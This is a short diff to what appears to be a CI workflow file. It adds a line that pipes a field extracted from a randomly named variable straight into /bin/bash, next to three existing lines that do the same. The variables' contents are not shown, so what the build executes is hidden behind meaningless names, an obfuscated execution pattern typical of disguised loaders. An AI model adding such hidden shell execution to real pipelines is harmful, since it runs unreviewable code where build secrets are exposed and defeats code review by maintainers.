@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$p3" | jq -r .yum45047 | /bin/bash
           echo $hwyip3828 | jq -r .wubb2 | /bin/bash
           echo $elcs22 | jq -r .oxn861 | /bin/bash
+          echo $nqj76510 | jq -r .vegv1 | /bin/bash
 
       - name: Archive output
         if: always()
